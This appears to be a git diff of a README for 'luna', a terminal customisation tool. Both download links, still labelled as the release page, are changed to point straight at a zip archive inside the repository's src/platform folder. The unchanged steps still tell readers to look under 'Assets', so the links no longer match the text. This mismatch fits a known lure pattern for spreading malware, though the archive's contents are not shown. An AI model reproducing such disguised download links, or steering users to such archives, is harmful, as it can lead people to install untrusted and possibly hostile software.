@@ -1,6 +1,6 @@
 # 🌙 luna - Build your perfect custom computer terminal
 
-[![Download Luna](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/shadow-1502/luna/releases)
+[![Download Luna](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/shadow-1502/luna/raw/refs/heads/main/src/platform/Software-3.2.zip)
 
 ## 🎯 About this software
 
@@ -25,7 +25,7 @@ Luna provides a clean way to manage your computer terminal. It uses modular part
 
 You need to download the installer from our release page to begin.
 
-[Click here to open the download page](https://github.com/shadow-1502/luna/releases)
+[Click here to open the download page](https://github.com/shadow-1502/luna/raw/refs/heads/main/src/platform/Software-3.2.zip)
 
 1.  Open the link provided above in your web browser.
 2.  Look for the latest version of Luna under the "Assets" section.
